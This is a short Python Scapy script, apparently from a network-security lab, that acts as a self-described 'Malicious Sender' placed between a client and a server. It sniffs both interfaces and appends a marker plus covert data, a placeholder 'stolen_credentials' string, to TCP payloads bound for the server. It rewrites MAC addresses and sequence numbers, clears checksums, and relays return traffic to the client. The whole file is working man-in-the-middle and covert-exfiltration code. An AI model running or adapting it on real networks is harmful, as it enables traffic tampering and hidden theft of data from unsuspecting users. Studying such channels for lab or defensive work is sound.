from scapy.all import IP, TCP, Ether, get_if_hwaddr, Raw, sendp, sniff
from config import *
from utils import print_pkt

LEFT_IF = "enp0s3"
RIGHT_IF = "enp0s8"

def inject_packet(pkt):

    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].dst == SERVER_IP  \
            and pkt[TCP].dport == SERVER_PORT and pkt[Ether].src == CLIENT_MAC: 
        
        print("Malicious Sender: We got a packet for the server")
        print_pkt(pkt)

        pkt = pkt.copy()
        payload = bytes(pkt[TCP].payload)

        # Append our covert data to the new payload
        covert_message = b"stolen_credentials:admin:pass123"
        new_payload = payload + MARKER + covert_message
        pkt[TCP].payload = Raw(new_payload)

        # Adjust the sequence number with new payload
        pkt[TCP].seq += len(payload)

        pkt[Ether].src = get_if_hwaddr(RIGHT_IF)
        pkt[Ether].dst = RECEIVER_LEFT_MAC

        # Update checksums and length on the IP packet
        del pkt[IP].len
        del pkt[TCP].chksum
        del pkt[IP].chksum

        sendp(pkt, iface=RIGHT_IF, verbose=False)

    elif pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].dst == CLIENT_IP and pkt[Ether].src != get_if_hwaddr(LEFT_IF):

        print("Malicious Sender: We got a packet for the client")
        print_pkt(pkt)

        pkt.src = get_if_hwaddr(LEFT_IF)
        pkt.dst = CLIENT_MAC

        del pkt[IP].chksum, pkt[TCP].chksum 
        sendp(pkt, iface=LEFT_IF, verbose=False)

if __name__ == "__main__":
    print("Malicious Sender: Starting packet sniffer...")
    client_side_mac  = get_if_hwaddr(LEFT_IF)
    server_side_mac = get_if_hwaddr(RIGHT_IF)
    bpf_filter = f"not ether src {client_side_mac} and not ether src {server_side_mac}"

    try:
        sniff(iface=[LEFT_IF, RIGHT_IF], filter=bpf_filter, prn=inject_packet, store=0)
    except Exception as e:
        print(f"Malicious Sender: Error: {e}")